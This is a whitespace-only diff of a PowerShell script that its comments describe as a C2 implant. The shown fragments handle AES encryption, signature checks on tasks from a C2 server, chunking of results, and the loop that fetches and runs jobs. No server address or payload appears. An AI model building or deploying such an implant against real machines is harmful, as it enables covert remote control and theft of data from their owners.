@@ -27,7 +27,7 @@ add-type @"
 }
 catch{ throw $_; }
 
-# function to decrypt aes 
+# function to decrypt aes
 function func_aes_decrypt
 {
   param($text1, $key1, $iv1)
@@ -74,13 +74,13 @@ function func_aes_encrypt
 function func_verify_task
 {
     # the string of "task_id,task_type,task_opt" that tells us what to do
-    param($task_string, 
+    param($task_string,
         # the hash of the task_string, encrypted with the server's key
-          $digest,  
+          $digest,
         # the key that we'll use to decrypt the hash and verify the sig
-          $key3, $iv3)         
+          $key3, $iv3)
 
-   
+
    # verify signature
    $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($task_string))
 
@@ -89,7 +89,7 @@ function func_verify_task
    # compares the digest byte by byte to make sure it is the same
    $verified = 1
    for($counter = 0; $counter -lt $msg_digest.Length; $counter++)
-   {        
+   {
         if($msg_digest[$counter] -ne $digest_dec[$counter])
         {
             $verified = 0
@@ -104,11 +104,11 @@ function func_sign_results
 {
      # the string we want to send to the server the key we'll use to sign
     param($results_str,
-          $key4, $iv4)         
+          $key4, $iv4)
 
     # performs signature algorithm
     $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($results_str))
-    
+
     # encrypts the message digest
     $sig_digest = func_aes_encrypt $msg_digest $key4 $iv4
 
@@ -126,9 +126,9 @@ function func_chunk
 # the data that we're going to chunk
 # the current byte that we're starting the next chunk at
 # the maximum size of the chunk
-    param([string]$data,        
-          [int]$current_byte,     
-          [int]$max_data_size)    
+    param([string]$data,
+          [int]$current_byte,
+          [int]$max_data_size)
 
 
     # gets where to start the chunk, as in do we send the rest of the data, or a subset
@@ -140,7 +140,7 @@ function func_chunk
 
     # shifts the current byte variable to where we left off
     $new_current_byte = $chunk_bound + $current_byte
-    
+
     # if our new "current byte" is the end of the results string, we can be done sending data
     if($new_current_byte -ge $data.Length)
     {
@@ -183,7 +183,7 @@ function func_sa
 }
 
 # func_get_tasks - used to get tasks from the C2 server and then parse them into the jobs format
-function func_get_tasks 
+function func_get_tasks
 {
 
     # temp variable that will store the final job format after we parse the task
@@ -251,7 +251,7 @@ function func_execute_jobs
     for ($counter = 0; $counter -lt $list_of_jobs.Length; $counter++)
     {
 
-        
+
         # perform job, give update to is_completed flag on the progress of the job
         # implant functions should return, results, and progress completed.
         # every response will need to be chunked IAW the max_data_size variable
@@ -265,7 +265,7 @@ function func_execute_jobs
 
             # splits up job string into different varaibles
             $task_vals = $job -split '<br>'
-    
+
             # task_id = first value
             $task_id = $task_vals[0]
             # task_type = second value
@@ -274,7 +274,7 @@ function func_execute_jobs
             $task_options = $task_vals[2]
             # current_byte, how much of the job results we have currently sent is the fourth value
             $current_byte = $task_vals[3]
-            
+
             # if current_byte is zero, it means that we have not sent any data related to the job yet,
             # AKA the job has not yet run
             if($current_byte -eq 0)
@@ -292,7 +292,7 @@ function func_execute_jobs
                 # gets the results that we've stored
                 $results = $task_vals[4]
             }
-            
+
 
             # chunks the results according to our max_data_size and current byte we've sent up to
             $results_chunk = (func_chunk $results $current_byte $max_data_size) -split "<chnk>"
@@ -325,7 +325,7 @@ function func_execute_jobs
                 exit
             }
 
-            
+
             # if we still have results to send
             if($current_byte -ne "true")
             {
@@ -335,7 +335,7 @@ function func_execute_jobs
                 $final_job_list += $list_of_jobs[$counter]
             }
 
-            
+
         }
 
     }
